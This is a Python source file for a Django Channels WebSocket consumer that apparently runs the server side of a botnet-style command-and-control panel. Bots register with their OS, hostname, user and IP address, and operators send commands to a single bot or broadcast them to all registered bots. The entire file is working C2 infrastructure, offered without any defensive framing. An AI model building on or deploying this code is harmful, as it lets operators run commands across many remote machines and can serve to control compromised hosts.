from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async
from asgiref.sync import sync_to_async
from channels.layers import get_channel_layer
from urllib.parse import unquote

from django.contrib.sessions.models import Session
from django.contrib.auth.models import User
from ui.models import Bot, UserClass, RegisterJoin, Request, Broadcast, Settings
from ui.views import GenerateAPIKey
from django.utils import timezone

import json
import uuid
import base64

"""
    WebSocketClient's room is created this way::: The bot sends json_data, which is encoded in base64 and contains necessary data about the bot,
    Like os, ip_address, hostname and user. `room_id` itself is going to be base64 encoded string. That will be written in the database So the
    client can access the terminal terminal correctly. After that, the data will be decoded from base64 and deserialized to get the correct JSON
    data. After that, the necessary data will be read from the JSON data and saved in the database. Then the communication will continue as if
    nothing happened at all.

    `yes` or `no` means if the client is bot or the client. `yes` means that the client is client and `no` means that the client is actually a
    bot.

    The last parameter is going to be `session_id`. This is for determing the user to find its class and to create `Request` and `Broadcast`
    objects accordingly.
"""

class WebSocketClient(AsyncWebsocketConsumer):
    async def connect(self):
        try:
            await self.accept()
            key_room_id = self.scope['url_route']['kwargs']['key_room_id']
            
            # Some self stuff
            self.room_id = key_room_id

            # Get if the client is the user or bot
            self.is_user = self.scope['url_route']['kwargs']['is_user']
            if self.is_user == 'yes':
                self.session_id = self.scope['url_route']['kwargs']['session_id']
                session = await database_sync_to_async(Session.objects.get)(session_key=self.session_id)
                if session.expire_date > timezone.now():
                    user_id = session.get_decoded().get('_auth_user_id')
                    self.user = await database_sync_to_async(User.objects.get)(pk=user_id)
                else:
                    await self.close()
                if self.room_id == 'None':
                    channel_layer = get_channel_layer()
                    await channel_layer.group_add(self.room_id, self.channel_name)
                else:
                    check_bot = await database_sync_to_async(Bot.objects.get)(room_id=self.room_id)
                    if check_bot.is_being_used == True:
                        await self.close()
                    channel_layer = get_channel_layer()
                    await channel_layer.group_add(self.room_id, self.channel_name)

                if self.room_id == 'None':
                    pass
                else:
                    # Update bot usage State
                    current_bot = await database_sync_to_async(Bot.objects.get)(room_id=self.room_id)
                    current_bot.is_being_used = True
                    await database_sync_to_async(current_bot.save)()

                # Some self stuff
                self.is_bot = False
            else:
                # Some self stuff
                self.is_bot = True

                try:
                    base64_decoded_key_room_id = base64.b64decode(key_room_id) # Full work here
                except:
                    base64_decoded_key_room_id = base64.b64decode(key_room_id + '==')
                json_data = json.loads(base64_decoded_key_room_id)

                os = json_data.get('os')
                hostname = json_data.get('hostname')
                user = json_data.get('user')
                ip_address = self.scope['client'][0]
                self.os = os
                self.hostname = hostname
                self.user = user
                self.ip_address = ip_address

                channel_layer = get_channel_layer()
                await channel_layer.group_add(self.room_id, self.channel_name)

                try:
                    await database_sync_to_async(Bot.objects.get)(room_id=key_room_id, os=os, hostname=hostname, user=user, ip_address=ip_address)

                    new_register = await database_sync_to_async(RegisterJoin.objects.create)(os=os, hostname=hostname, user=user, ip_address=ip_address)
                    await database_sync_to_async(new_register.save)()
                except:
                    new_bot_entry = await database_sync_to_async(Bot.objects.create)(room_id=key_room_id, os=os, hostname=hostname, user=user, ip_address=ip_address)
                    await database_sync_to_async(new_bot_entry.save)()

                    new_register = await database_sync_to_async(RegisterJoin.objects.create)(os=os, hostname=hostname, user=user, ip_address=ip_address)
                    await database_sync_to_async(new_register.save)()
                bot = await database_sync_to_async(Bot.objects.get)(room_id=key_room_id, os=os, hostname=hostname, user=user, ip_address=ip_address)
                bot.is_online = True
                await database_sync_to_async(bot.save)()
        except:
            await self.send({'error': 'invalid_error'})
            await self.close()
    async def receive(self, text_data):
        if self.is_user == 'yes':
            data = json.loads(text_data)
            data_type = data.get('type')
            cmd_data = data.get('data')

            if data_type == 'request':
                bot = await database_sync_to_async(Bot.objects.get)(room_id=self.room_id)
                new_request = await database_sync_to_async(Request.objects.create)(user=self.user, cmd=cmd_data, target=bot)
                await database_sync_to_async(new_request.save)()
                channel_layer = get_channel_layer()
                await channel_layer.group_send(
                    self.room_id,
                    {
                        'type': 'forward_data',
                        'channel_name': self.channel_name,
                        'data': text_data,
                    }
                )
            elif data_type == 'broadcast':
                settings = await database_sync_to_async(Settings.objects.first)()
                if settings.broadcast_enabled == False:
                    pass
                else:
                    new_broadcast = await database_sync_to_async(Broadcast.objects.create)(user=self.user, cmd=cmd_data)
                    await database_sync_to_async(new_broadcast.save)()

                    self.counter_bot = 1
                    while True:
                        try:
                            bot = await database_sync_to_async(Bot.objects.get)(id=self.counter_bot)
                        except:
                            break
                        room_id = bot.room_id
                        channel_layer = get_channel_layer()
                        await channel_layer.group_send(
                            room_id,
                            {
                                'type': 'forward_data',
                                'channel_name': self.channel_name,
                                'data': text_data,
                            }
                        )

                        self.counter_bot += 1
        else:
            channel_layer = get_channel_layer()
            await channel_layer.group_send(
                self.room_id,
                {
                    'type': 'forward_data',
                    'channel_name': self.channel_name,
                    'data': text_data,
                }
            )
    async def forward_data(self, event):
        data = event['data']
        channel_name = event['channel_name']
        if channel_name != self.channel_name:
            await self.send(data)
    async def disconnect(self, err_code):
        if self.is_bot == True:
            bot = await database_sync_to_async(Bot.objects.get)(room_id=self.room_id, os=self.os, hostname=self.hostname, user=self.user, ip_address=self.ip_address)
            bot.is_online=False
            await database_sync_to_async(bot.save)()

        if self.room_id != 'None':
            # Update bot usage State
            current_bot = await database_sync_to_async(Bot.objects.get)(room_id=self.room_id)
            current_bot.is_being_used = False
            await database_sync_to_async(current_bot.save)()
        
        channel_layer = get_channel_layer()
        await channel_layer.group_discard(self.room_id, self.channel_name)
        await self.close()